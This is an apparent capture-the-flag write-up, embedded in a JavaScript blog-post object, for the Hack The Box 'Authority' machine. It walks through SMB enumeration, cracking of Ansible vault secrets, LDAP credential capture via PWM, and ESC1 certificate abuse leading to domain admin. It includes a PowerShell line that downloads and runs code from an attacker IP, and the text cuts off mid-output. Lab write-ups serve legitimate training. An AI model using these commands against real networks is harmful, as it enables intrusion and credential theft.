const newPost = {
    title: 'Authority',
    body: `
    <ul>
    <li><h1>Enumeration</h1>
    </ul>
    <div class="script-container"><p>This time I will show u a new tool that I have been using for a long time I like it for its speed and accurate it called <a href="https://github.com/shadow1ng/fscan">fscan</a></p>
    <ul>
    <pre><code>
    ┌──(root㉿N1NJ10)-[~]
    └─# fscan -h 10.10.11.222
    fscan version: 1.8.2
    start infoscan
    (icmp) Target 10.10.11.222    is alive
    [*] Icmp alive hosts len is: 1
    10.10.11.222:80 open
    10.10.11.222:135 open
    10.10.11.222:139 open
    10.10.11.222:445 open
    10.10.11.222:88 open
    10.10.11.222:8443 open
    [*] alive ports len is: 6
    start vulscan
    [*] WebTitle: [http://10.10.11.222](http://10.10.11.222/)       code:200 len:703    title:IIS Windows Server
    [*] NetInfo:
    [*]10.10.11.222
    [->]authority
    [->]10.10.11.222
    [->]dead:beef::44
    [->]dead:beef::5996:d6d:3fba:b8d9
    [*] WebTitle: [https://10.10.11.222:8443](https://10.10.11.222:8443/) code:200 len:82     title:None
    已完成 6/6
    [*] 扫描结束,耗时: 1m42.377993181s

    # Nmap lovers 

    ┌──(root㉿N1NJ10)-[~]
    └─# nmap -Pn --disable-arp-ping -n -sV --min-parallelism 64 10.10.11.222 -p 80,135,139,445,88,8443
    Starting Nmap 7.94SVN ( [https://nmap.org](https://nmap.org/) ) at 2023-12-29 01:27 EST
    Nmap scan report for 10.10.11.222
    Host is up (0.25s latency).

    PORT     STATE SERVICE       VERSION
    80/tcp   open  http          Microsoft IIS httpd 10.0
    88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-12-29 10:27:10Z)
    135/tcp  open  msrpc         Microsoft Windows RPC
    139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
    445/tcp  open  microsoft-ds?
    8443/tcp open  ssl/https-alt
    Nmap done: 1 IP address (1 host up) scanned in 62.13 seconds

    # Add Me 

    ┌──(root㉿N1NJ10)-[~/Downloads/tools/fscan]
    └─# echo -n '10.10.11.222   authority.htb' > /etc/hosts

    </code></pre>
    </ul>
    <p>As we see it maybe a domain controller, We have 2 options to start our Web enum 80 , 8443 port let's see what is there</p>
    <figure><img src="https://raw.githubusercontent.com/N1NJ10/N1NJ10.github.io/main/pages/Photos/Authority/1.png" alt=""><figcaption></figcaption></figure>
    <p>First one is an IIS server is we see</p>
    <figure><img src="https://raw.githubusercontent.com/N1NJ10/N1NJ10.github.io/main/pages/Photos/Authority/2.png" alt=""><figcaption></figcaption></figure>
    <p>The other is PWM . <a href="https://github.com/pwm-project/pwm">But what is PWM-project ?</a> PWM is an open source password self-service application for LDAP directories.</p>
    <p>After playing around we found that the PWM is in an <a href="https://github.com/pwm-project/pwm/blob/master/server/src/main/resources/password/pwm/i18n/Config.properties">open configuration mode</a> but it leads us to nothing maybe we should look into something else</p>
    <div class="script-container">We start to see if we have anonymous access on the SMB shares with <a href="https://github.com/Pennyw0rth/NetExec">Netexec</a></p>
    <ul>
    <pre><code>
    ┌──(root㉿N1NJ10)-[~]
    └─# netexec smb 10.10.11.222 -u anonymous -p '' --shares
    SMB         10.10.11.222    445    AUTHORITY        [] Windows 10.0 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)
    SMB         10.10.11.222    445    AUTHORITY        [+] authority.htb\\anonymous:
    SMB         10.10.11.222    445    AUTHORITY        [] Enumerated shares
    SMB         10.10.11.222    445    AUTHORITY        Share           Permissions     Remark
    SMB         10.10.11.222    445    AUTHORITY        -----           -----------     ------
    SMB         10.10.11.222    445    AUTHORITY        ADMIN$                          Remote Admin
    SMB         10.10.11.222    445    AUTHORITY        C$                              Default share
    SMB         10.10.11.222    445    AUTHORITY        Department Shares
    SMB         10.10.11.222    445    AUTHORITY        Development     READ
    SMB         10.10.11.222    445    AUTHORITY        IPC$            READ            Remote IPC
    SMB         10.10.11.222    445    AUTHORITY        NETLOGON                        Logon server share
    SMB         10.10.11.222    445    AUTHORITY        SYSVOL                          Logon server share

    ┌──(root㉿N1NJ10)-[~/HTB/Authority]
    └─# smbclient [//10.10.11.222/Development](notion://10.10.11.222/Development) -U anonymous%''

    smb: \\Automation\\Ansible\\> prompt off
    smb: \\Automation\\Ansible\\> recurse true
    smb: \\Automation\\Ansible\\> mget PWM
    </code></pre>
    </ul>
    <div class="script-container"><p>We find that we have anonymous access to the Development directory so after playing around we find the PWM directory inside the Development  share  so we download it , Let's see what is the interesting files inside it </p>
    <ul>
    <pre><code>
    ┌──(root㉿N1NJ10)-[~/HTB/Authority]
    └─# cat ansible_inventory
    ansible_user: administrator
    ansible_password: Welcome1
    ansible_port: 5985
    ansible_connection: winrm
    ansible_winrm_transport: ntlm
    ansible_winrm_server_cert_validation: ignore

    ┌──(root㉿N1NJ10)-[~/HTB/Authority]
    └─# cat tomcat-users.xml.j2
    ?xml version='1.0' encoding='cp1252'?
    tomcat-users xmlns="http://tomcat.apache.org/xml" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
    version="1.0"
    user username="admin" password="T0mc@tAdm1n" roles="manager-gui"
    user username="robot" password="T0mc@tR00t" roles="manager-script"
    tomcat-users

    ┌──(root㉿N1NJ10)-[~/HTB/Authority/PWM/defaults]
    └─# cat main.yml

    pwm_run_dir: "{{ lookup('env', 'PWD') }}"

    pwm_hostname: authority.htb.corp
    pwm_http_port: "{{ http_port }}"
    pwm_https_port: "{{ https_port }}"
    pwm_https_enable: true

    pwm_require_ssl: false

    pwm_admin_login: !vault |
    $ANSIBLE_VAULT;1.1;AES256
    32666534386435366537653136663731633138616264323230383566333966346662313161326239
    6134353663663462373265633832356663356239383039640a346431373431666433343434366139
    35653634376333666234613466396534343030656165396464323564373334616262613439343033
    6334326263326364380a653034313733326639323433626130343834663538326439636232306531
    3438

    pwm_admin_password: !vault |
    $ANSIBLE_VAULT;1.1;AES256
    31356338343963323063373435363261323563393235633365356134616261666433393263373736
    3335616263326464633832376261306131303337653964350a363663623132353136346631396662
    38656432323830393339336231373637303535613636646561653637386634613862316638353530
    3930356637306461350a316466663037303037653761323565343338653934646533663365363035
    6531

    ldap_uri: ldap://127.0.0.1/
    ldap_base_dn: "DC=authority,DC=htb"
    ldap_admin_password: !vault |
    $ANSIBLE_VAULT;1.1;AES256
    63303831303534303266356462373731393561313363313038376166336536666232626461653630
    3437333035366235613437373733316635313530326639330a643034623530623439616136363563
    34646237336164356438383034623462323531316333623135383134656263663266653938333334
    3238343230333633350a646664396565633037333431626163306531336336326665316430613566
    3764

    </code></pre>
    </ul>
    <p>I try to test this cleartext credentials to get an session with  psexec or evil-winrm but with no good luck , so I look at the main.yml and after search i found this is an <a href="https://docs.ansible.com/ansible/latest/vault_guide/index.html">ANSIBLE_VAULT</a> but what is it ? Ansible vault provides a way to encrypt and manage sensitive data such as passwords. </p>
    <div class="script-container"><p>After googling I found that I could <a href="https://exploit-notes.hdks.org/exploit/cryptography/algorithm/ansible-vault-secret/">crack the encryption key by brute-forcing</a></p>
    <ul>
    <pre><code>
    ┌──(root㉿N1NJ10)-[~/HTB/Authority/PWM/defaults]
    └─# cat pwm_admin_login.yaml
    $ANSIBLE_VAULT;1.1;AES256
    32666534386435366537653136663731633138616264323230383566333966346662313161326239
    6134353663663462373265633832356663356239383039640a346431373431666433343434366139
    35653634376333666234613466396534343030656165396464323564373334616262613439343033
    6334326263326364380a653034313733326639323433626130343834663538326439636232306531
    3438
    
    ┌──(root㉿N1NJ10)-[~/HTB/Authority/PWM/defaults]
    └─# ansible2john pwm_admin_login.yaml > pwm_admin_login.txt
    
    ┌──(root㉿N1NJ10)-[~/HTB/Authority/PWM/defaults]
    └─# hashcat -m 16900 pwm_admin_login.txt /usr/share/wordlists/rockyou.txt  --user
    
    $ansible$0*0*2fe48d56e7e16f71c18abd22085f39f4fb11a2b9a456cf4b72ec825fc5b9809d*e041732f9243ba0484f582d9cb20e148*4d1741fd34446a95e647c3fb4a4f9e4400eae9dd25d734abba49403c42bc2cd8:!@#$%^&*
    
    Session..........: hashcat
    Status...........: Cracked
    Hash.Mode........: 16900 (Ansible Vault)
    Hash.Target......: $ansible$0*0*2fe48d56e7e16f71c18abd22085f39f4fb11a2...bc2cd8
    Time.Started.....: Fri Dec 29 15:14:03 2023 (39 secs)
    Time.Estimated...: Fri Dec 29 15:14:42 2023 (0 secs)
    Kernel.Feature...: Pure Kernel
    Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
    Guess.Queue......: 1/1 (100.00%)
    Speed.#1.........:     1044 H/s (5.69ms) @ Accel:64 Loops:512 Thr:1 Vec:8
    Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
    Progress.........: 39936/14344385 (0.28%)
    Rejected.........: 0/39936 (0.00%)
    Restore.Point....: 39744/14344385 (0.28%)
    Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:9728-9999
    Candidate.Engine.: Device Generator
    Candidates.#1....: 051790 -> prospect
    Hardware.Mon.#1..: Util: 98%
    
    Started: Fri Dec 29 15:13:22 2023
    Stopped: Fri Dec 29 15:14:43 2023
    
    ┌──(root㉿N1NJ10)-[~/HTB/Authority/PWM/defaults]
    └─# cat pwm_admin_password
    $ANSIBLE_VAULT;1.1;AES256
    31356338343963323063373435363261323563393235633365356134616261666433393263373736
    3335616263326464633832376261306131303337653964350a363663623132353136346631396662
    38656432323830393339336231373637303535613636646561653637386634613862316638353530
    3930356637306461350a316466663037303037653761323565343338653934646533663365363035
    6531
    
    ┌──(root㉿N1NJ10)-[~/HTB/Authority/PWM/defaults]
    └─# ansible2john pwm_admin_password > pwm_admin_password.txt
    
    ┌──(root㉿N1NJ10)-[~/HTB/Authority/PWM/defaults]
    └─# hashcat -m 16900 pwm_admin_password.txt  /usr/share/wordlists/rockyou.txt  --user
    
    $ansible$0*0*15c849c20c74562a25c925c3e5a4abafd392c77635abc2ddc827ba0a1037e9d5*1dff07007e7a25e438e94de3f3e605e1*66cb125164f19fb8ed22809393b1767055a66deae678f4a8b1f8550905f70da5:!@#$%^&*
    
    Session..........: hashcat
    Status...........: Cracked
    Hash.Mode........: 16900 (Ansible Vault)
    Hash.Target......: $ansible$0*0*15c849c20c74562a25c925c3e5a4abafd392c7...f70da5
    Time.Started.....: Fri Dec 29 15:19:05 2023 (40 secs)
    Time.Estimated...: Fri Dec 29 15:19:45 2023 (0 secs)
    Kernel.Feature...: Pure Kernel
    Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
    Guess.Queue......: 1/1 (100.00%)
    Speed.#1.........:      991 H/s (23.37ms) @ Accel:128 Loops:512 Thr:1 Vec:8
    Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
    Progress.........: 39936/14344385 (0.28%)
    Rejected.........: 0/39936 (0.00%)
    Restore.Point....: 39552/14344385 (0.28%)
    Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:9728-9999
    Candidate.Engine.: Device Generator
    Candidates.#1....: PASAWAY -> prospect
    Hardware.Mon.#1..: Util: 94%
    
    Started: Fri Dec 29 15:19:04 2023
    Stopped: Fri Dec 29 15:19:47 2023

    ┌──(root㉿N1NJ10)-[~/HTB/Authority/PWM/defaults]
    └─# cat ldap_admin_password.yaml | ansible-vault decrypt
    DevT3st@123

    ┌──(root㉿N1NJ10)-[~/HTB/Authority/PWM/defaults]
    └─# cat pwm_admin_login.yaml | ansible-vault decrypt
    svc_pwm

    ┌──(root㉿N1NJ10)-[~/HTB/Authority/PWM/defaults]
    └─# cat pwm_admin_password.yaml | ansible-vault decrypt
    pWm_@dm!N_!23

    </code></pre>
    </ul>
    <div class="script-container"><p>Now we have creds to test again let's start to test them with additional enum</p>
    <ul>
    <pre><code>
    ┌──(root㉿N1NJ10)-[~/HTB/Authority]
    └─# netexec smb 10.10.11.222 -u anonymous -p '' --rid-brute 10000
    SMB         10.10.11.222    445    AUTHORITY        [*] Windows 10.0 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)
    SMB         10.10.11.222    445    AUTHORITY        [+] authority.htb\anonymous:
    SMB         10.10.11.222    445    AUTHORITY        498: HTB\Enterprise Read-only Domain Controllers (SidTypeGroup)
    SMB         10.10.11.222    445    AUTHORITY        500: HTB\Administrator (SidTypeUser)
    SMB         10.10.11.222    445    AUTHORITY        501: HTB\Guest (SidTypeUser)
    SMB         10.10.11.222    445    AUTHORITY        502: HTB\krbtgt (SidTypeUser)
    SMB         10.10.11.222    445    AUTHORITY        512: HTB\Domain Admins (SidTypeGroup)
    SMB         10.10.11.222    445    AUTHORITY        513: HTB\Domain Users (SidTypeGroup)
    SMB         10.10.11.222    445    AUTHORITY        514: HTB\Domain Guests (SidTypeGroup)
    SMB         10.10.11.222    445    AUTHORITY        515: HTB\Domain Computers (SidTypeGroup)
    SMB         10.10.11.222    445    AUTHORITY        516: HTB\Domain Controllers (SidTypeGroup)
    SMB         10.10.11.222    445    AUTHORITY        517: HTB\Cert Publishers (SidTypeAlias)
    SMB         10.10.11.222    445    AUTHORITY        518: HTB\Schema Admins (SidTypeGroup)
    SMB         10.10.11.222    445    AUTHORITY        519: HTB\Enterprise Admins (SidTypeGroup)
    SMB         10.10.11.222    445    AUTHORITY        520: HTB\Group Policy Creator Owners (SidTypeGroup)
    SMB         10.10.11.222    445    AUTHORITY        521: HTB\Read-only Domain Controllers (SidTypeGroup)
    SMB         10.10.11.222    445    AUTHORITY        522: HTB\Cloneable Domain Controllers (SidTypeGroup)
    SMB         10.10.11.222    445    AUTHORITY        525: HTB\Protected Users (SidTypeGroup)
    SMB         10.10.11.222    445    AUTHORITY        526: HTB\Key Admins (SidTypeGroup)
    SMB         10.10.11.222    445    AUTHORITY        527: HTB\Enterprise Key Admins (SidTypeGroup)
    SMB         10.10.11.222    445    AUTHORITY        553: HTB\RAS and IAS Servers (SidTypeAlias)
    SMB         10.10.11.222    445    AUTHORITY        571: HTB\Allowed RODC Password Replication Group (SidTypeAlias)
    SMB         10.10.11.222    445    AUTHORITY        572: HTB\Denied RODC Password Replication Group (SidTypeAlias)
    SMB         10.10.11.222    445    AUTHORITY        1000: HTB\AUTHORITY$ (SidTypeUser)
    SMB         10.10.11.222    445    AUTHORITY        1101: HTB\DnsAdmins (SidTypeAlias)
    SMB         10.10.11.222    445    AUTHORITY        1102: HTB\DnsUpdateProxy (SidTypeGroup)
    SMB         10.10.11.222    445    AUTHORITY        1601: HTB\svc_ldap (SidTypeUser)

    ┌──(root㉿N1NJ10)-[~/Downloads/tools/fscan]
    └─# netexec winrm 10.10.11.222 -u svc_pwm -p 'pWm_@dm!N_!23'
    SMB         10.10.11.222    445    AUTHORITY        [*] Windows 10.0 Build 17763 (name:AUTHORITY) (domain:authority.htb)
    WINRM       10.10.11.222    5985   AUTHORITY        [-] authority.htb\svc_pwm:pWm_@dm!N_!23
    
    ┌──(root㉿N1NJ10)-[~/Downloads/tools/fscan]
    └─# netexec smb 10.10.11.222 -u svc_pwm -p 'pWm_@dm!N_!23' --shares
    SMB         10.10.11.222    445    AUTHORITY        [*] Windows 10.0 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)
    
    SMB         10.10.11.222    445    AUTHORITY        [+] authority.htb\svc_pwm:pWm_@dm!N_!23
    SMB         10.10.11.222    445    AUTHORITY        [-] Error enumerating shares: STATUS_ACCESS_DENIED

    </code></pre>
    </ul>
    <ul>
    <li><h1>Exploit_Me</h1>
    </ul>
    <p>Again with no chance to have a session but remember the PWM site let's explore it again with our creds, After explore it we found that we can get in and we have permission to change the LDAP request to send it to our IP</p>
    <figure><img src="https://raw.githubusercontent.com/N1NJ10/N1NJ10.github.io/main/pages/Photos/Authority/5.png" alt=""><figcaption></figcaption></figure>
    <p>Note that you also should change the LDAPS to LDAP to recive the creds in cleartext</p> 
    <figure><img src="https://raw.githubusercontent.com/N1NJ10/N1NJ10.github.io/main/pages/Photos/Authority/4.png" alt=""><figcaption></figcaption></figure>
    <p>Or from wireshark</p> 
    <figure><img src="https://raw.githubusercontent.com/N1NJ10/N1NJ10.github.io/main/pages/Photos/Authority/6.png" alt=""><figcaption></figcaption></figure>
    <div class="script-container"><p>Okey let's test our creds again</p>
    <ul>
    <pre><code>
    # WINRM test 

    ┌──(root㉿N1NJ10)-[~]
    └─# netexec winrm 10.10.11.222 -u svc_ldap -p 'lDaP_1n_th3_cle4r!'

    SMB         10.10.11.222    445    AUTHORITY        [*] Windows 10.0 Build 17763 (name:AUTHORITY) (domain:authority.htb)
    WINRM       10.10.11.222    5985   AUTHORITY        [+] authority.htb\svc_ldap:lDaP_1n_th3_cle4r! (Pwn3d!)

    #Get in 

    ┌──(root㉿N1NJ10)-[~]
    └─# evil-winrm -i 10.10.11.222 --user svc_ldap --password 'lDaP_1n_th3_cle4r!'

    Evil-WinRM shell v3.5

    Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

    Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

    Info: Establishing connection to remote endpoint
    *Evil-WinRM* PS C:\\Users\\svc_ldap\\Documents>

    # Go to Metasploit 

    *Evil-WinRM* PS C:\\Users\\svc_ldap\\Documents> iex (New-Object Net.Webclient).DownloadString("http://10.10.16.41:9999/RZJa2XhzAdN1")

    </code></pre>
    </ul>

    <ul>
    <li><h1>Privesc</h1>
    </ul>
    <div class="script-container"><p>Now let's try to get the administrator account </p>
    <ul>
    <pre><code>
    C:\\Windows\\system32>whoami /all
    whoami /all
    
    ## USER INFORMATION
    
    User Name    SID
    
    ============ =============================================
    htb\svc_ldap S-1-5-21-622327497-3269355298-2248959698-1601
    
    ## GROUP INFORMATION
    
    Group Name                                  Type             SID          Attributes
    
    =========================================== ================ ============ ==================================================
    Everyone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
    BUILTIN\\Remote Management Users             Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
    BUILTIN\\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
    BUILTIN\\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
    BUILTIN\\Certificate Service DCOM Access     Alias            S-1-5-32-574 Mandatory group, Enabled by default, Enabled group
    NT AUTHORITY\\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
    NT AUTHORITY\\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
    NT AUTHORITY\\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
    NT AUTHORITY\\NTLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
    Mandatory Label\\Medium Plus Mandatory Level Label            S-1-16-8448
    
    ## PRIVILEGES INFORMATION
    
    Privilege Name                Description                    State
    
    ============================= ============================== =======
    SeMachineAccountPrivilege     Add workstations to domain     Enabled
    SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
    SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
    
    ## USER CLAIMS INFORMATION
    
    User claims unknown.
    
    Kerberos support for Dynamic Access Control on this device has been disabled.
    
    </code></pre>
    </ul>
    <p>We can see the svc_ldap user are member of the    Certificate Service DCOM Access group that's mean we have management and access control capabilities on the certificates in the domain </p> 

    <div class="script-container"><p>We can start with <a href="https://github.com/ly4k/Certipy">Certipy</a> , If you are new in AD certificates attacks click  <a href="https://pastebin.com/U8F6zxqG">here</a> i provide you all the resources to understand what is that mean</p>
    <ul>
    <pre><code>
    ┌──(root㉿N1NJ10)-[~/Downloads/tools/Certipy/certipy]
    └─# python3 certipy.py find -u svc_ldap@authority.htb -p 'lDaP_1n_th3_cle4r!' -dc-ip 10.10.11.222 -vulnerable
    Certipy v4.8.2 - by Oliver Lyak (ly4k)

    [*] Finding certificate templates
    [*] Found 37 certificate templates
    [*] Finding certificate authorities
    [*] Found 1 certificate authority
    [*] Found 13 enabled certificate templates
    [*] Trying to get CA configuration for 'AUTHORITY-CA' via CSRA
    [!] Got error while trying to get CA configuration for 'AUTHORITY-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
    [*] Trying to get CA configuration for 'AUTHORITY-CA' via RRP
    [*] Got CA configuration for 'AUTHORITY-CA'
    [*] Saved BloodHound data to '20231230030747_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @ly4k
    [*] Saved text output to '20231230030747_Certipy.txt'
    [*] Saved JSON output to '20231230030747_Certipy.json'

    ┌──(root㉿N1NJ10)-[~/Downloads/tools/Certipy/certipy]
    └─# cat 20231230030747_Certipy.txt
    Certificate Authorities
    0
    CA Name                             : AUTHORITY-CA
    DNS Name                            : authority.authority.htb
    Certificate Subject                 : CN=AUTHORITY-CA, DC=authority, DC=htb
    Certificate Serial Number           : 2C4E1F3CA46BBDAF42A1DDE3EC33A6B4
    Certificate Validity Start          : 2023-04-24 01:46:26+00:00
    Certificate Validity End            : 2123-04-24 01:56:25+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
    Owner                             : AUTHORITY.HTB\Administrators
    Access Rights
    ManageCertificates              : AUTHORITY.HTB\Administrators
    AUTHORITY.HTB\Domain Admins
    AUTHORITY.HTB\Enterprise Admins
    ManageCa                        : AUTHORITY.HTB\Administrators
    AUTHORITY.HTB\Domain Admins
    AUTHORITY.HTB\Enterprise Admins
    Enroll                          : AUTHORITY.HTB\Authenticated Users
    Certificate Templates
    0
    Template Name                       : CorpVPN
    Display Name                        : Corp VPN
    Certificate Authorities             : AUTHORITY-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : AutoEnrollmentCheckUserDsCertificate
    PublishToDs
    IncludeSymmetricAlgorithms
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Encrypting File System
    Secure Email
    Client Authentication
    Document Signing
    IP security IKE intermediate
    IP security use
    KDC Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 20 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
    Enrollment Permissions
    Enrollment Rights               : AUTHORITY.HTB\Domain Computers
    AUTHORITY.HTB\Domain Admins
    AUTHORITY.HTB\Enterprise Admins
    Object Control Permissions
    Owner                           : AUTHORITY.HTB\Administrator
    Write Owner Principals          : AUTHORITY.HTB\Domain Admins
    AUTHORITY.HTB\Enterprise Admins
    AUTHORITY.HTB\Administrator
    Write Dacl Principals           : AUTHORITY.HTB\Domain Admins
    AUTHORITY.HTB\Enterprise Admins
    AUTHORITY.HTB\Administrator
    Write Property Principals       : AUTHORITY.HTB\Domain Admins
    AUTHORITY.HTB\Enterprise Admins
    AUTHORITY.HTB\Administrator
    [!] Vulnerabilities
    ESC1                              : 'AUTHORITY.HTB\\Domain Computers' can enroll, enrollee supplies subject and template allows client authentication
    </code></pre>
    </ul>
    
    <div class="script-container"><p>As you can see the AUTHORITY.HTB\\Domain Computers only can request thie vuln certificate so let's <a href="https://github.com/Kevin-Robertson/Powermad">add a domain pc</a> with <a href="https://tools.thehacker.recipes/impacket/examples/addcomputer.py">addcomputer</a> from impacket and <a href="https://github.com/arth0sz/Practice-AD-CS-Domain-Escalation">request the cert with the administrator account</a></p>
    <ul>
    <pre><code>
    ┌──(root㉿N1NJ10)-[~]
    └─# impacket-addcomputer 'authority.htb/svc_ldap:lDaP_1n_th3_cle4r!' -computer-name fady-pc -computer-pass Password123# -method LDAPS -debug -dc-ip 10.10.11.222
    Impacket v0.12.0.dev1+20231130.165011.d370e63 - Copyright 2023 Fortra

    [+] Impacket Library Installation Path: /usr/local/lib/python3.11/dist-packages/impacket
    [*] Successfully added machine account fady-pc$ with password Password123#.

    ┌──(root㉿N1NJ10)-[~/Downloads/tools/Certipy/certipy]
    └─# certipy req -username 'fady-pc$' -password Password123# -ca AUTHORITY-CA -dc-ip 10.10.11.222 -template CorpVPN -upn administrator@authority.htb
    Certipy v4.8.2 - by Oliver Lyak (ly4k)

    [*] Requesting certificate via RPC
    [-] Got error: Unknown DCE RPC fault status code: 00000721 # <a href="https://pastebin.com/tUM2dBuS">Why it this</a> 
    [-] Use -debug to print a stacktrace

    ┌──(root㉿N1NJ10)-[~/HTB/Authority]
    └─# echo -n '10.10.11.222 authority.authority.htb authority.htb' >> /etc/hosts
    
    ┌──(root㉿N1NJ10)-[~/HTB/Authority]
    └─# ntpdate 10.10.11.222
    2023-12-30 17:28:57.541282 (-0500) +14399.801610 +/- 0.166993 10.10.11.222 s1 no-leap
    CLOCK: time stepped by 14399.801610

    ┌──(root㉿N1NJ10)-[~/HTB/Authority]
    └─# certipy req -username fady-pc$ -password 'Password123#' -ca AUTHORITY-CA -dc-ip 10.10.11.222 -template CorpVPN -upn administrator@authority.htb -dns authority.htb -debug
    Certipy v4.8.2 - by Oliver Lyak (ly4k)

    [+] Generating RSA key
    [*] Requesting certificate via RPC
    [+] Trying to connect to endpoint: ncacn_np:10.10.11.222[\pipe\cert]
    [+] Connected to endpoint: ncacn_np:10.10.11.222[\pipe\cert]
    [*] Successfully requested certificate
    [*] Request ID is 4
    [*] Got certificate with multiple identifications
    UPN: 'administrator@authority.htb'
    DNS Host Name: 'authority.htb'
    [*] Certificate has no object SID
    [*] Saved certificate and private key to 'administrator_authority.pfx'


    ┌──(root㉿N1NJ10)-[~/HTB/Authority]
    └─# certipy auth -pfx administrator_authority.pfx -dc-ip 10.10.11.222
    
    Certipy v4.8.2 - by Oliver Lyak (ly4k)
    
    [*] Found multiple identifications in certificate
    [*] Please select one:
    [0] UPN: 'administrator@authority.htb'
    [1] DNS Host Name: 'authority.htb'
    
    > 0
    [] Using principal: administrator@authority.htb
    [] Trying to get TGT...
    [-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)
    >
    </code></pre>
    </ul>
    <div class="script-container"><p>What ?? why we can got our TGT ammm , After googling I found <a href="https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html">This can be because their certificates do not have the Smart Card Logon</a> , So after reading this blog i try to understand how to use the  <a href="https://pastebin.com/ECcFcrnv"> PassTheCert technique</a> </p>
    <ul>
    <pre><code>
    ┌──(root㉿N1NJ10)-[~/HTB/Authority]
    └─# certipy cert -pfx administrator_authority.pfx -nokey -out user.crt
    Certipy v4.8.2 - by Oliver Lyak (ly4k)

    [*] Writing certificate and  to 'user.crt'

    ┌──(root㉿N1NJ10)-[~/HTB/Authority]
    └─# certipy cert -pfx administrator_authority.pfx -nocert -out user.key
    Certipy v4.8.2 - by Oliver Lyak (ly4k)

    [*] Writing private key to 'user.key'

    ┌──(root㉿N1NJ10)-[~/HTB/Authority]
    └─# python [passthecert.py](http://passthecert.py/) -action ldap-shell -crt user.crt -key user.key -domain authority.htb -dc-ip 10.10.11.222
    Impacket v0.12.0.dev1+20231130.165011.d370e63 - Copyright 2023 Fortra

    Type help for list of commands

    # help

    add_computer computer [password] [nospns] - Adds a new computer to the domain with the specified password. If nospns is specified, computer will be created with only a single necessary HOST SPN. Requires LDAPS.
    rename_computer current_name new_name - Sets the SAMAccountName attribute on a computer object to a new value.
    add_user new_user [parent] - Creates a new user.
    add_user_to_group user group - Adds a user to a group.
    change_password user [password] - Attempt to change a given user's password. Requires LDAPS.
    clear_rbcd target - Clear the resource based constrained delegation configuration information.
    disable_account user - Disable the user's account.
    enable_account user - Enable the user's account.
    dump - Dumps the domain.
    search query [attributes,] - Search users and groups by name, distinguishedName and sAMAccountName.
    get_user_groups user - Retrieves all groups this user is a member of.
    get_group_users group - Retrieves all members of a group.
    get_laps_password computer - Retrieves the LAPS passwords associated with a given computer (sAMAccountName).
    grant_control target grantee - Grant full control of a given target object (sAMAccountName) to the grantee (sAMAccountName).
    set_dontreqpreauth user true/false - Set the don't require pre-authentication flag to true or false.
    set_rbcd target grantee - Grant the grantee (sAMAccountName) the ability to perform RBCD to the target (sAMAccountName).
    start_tls - Send a StartTLS command to upgrade from LDAP to LDAPS. Use this to bypass channel binding for operations necessitating an encrypted channel.
    write_gpo_dacl user gpoSID - Write a full control ACE to the gpo for the given user. The gpoSID must be entered surrounding by {}.
    exit - Terminates this session.

    # add_user_to_group svc_ldap administrators

    Adding user: svc_ldap to group Administrators result: OK

    # exit

    Bye!
    </code></pre>
    </ul>
    <div class="script-container"><p>Now we add the svc_ldap to the administrator group that's all we need to have an access to the administrator directory , Let's try to test it </p>
    <ul>
    <pre><code>
    ┌──(root㉿N1NJ10)-[~/HTB/Authority]
    └─# evil-winrm -i 10.10.11.222 --user svc_ldap --password 'lDaP_1n_th3_cle4r!'

    Evil-WinRM shell v3.5

    Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

    Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

    Info: Establishing connection to remote endpoint
    *Evil-WinRM* PS C:\\Users\\svc_ldap\\Documents> net user svc_ldap
    User name                    svc_ldap
    Full Name
    Comment
    User's comment
    Country/region code          000 (System Default)
    Account active               Yes
    Account expires              Never

    Password last set            8/10/2022 8:29:31 PM
    Password expires             Never
    Password changeable          8/11/2022 8:29:31 PM
    Password required            Yes
    User may change password     Yes

    Workstations allowed         All
    Logon script
    User profile
    Home directory
    Last logon                   7/5/2023 7:43:09 PM

    Logon hours allowed          All

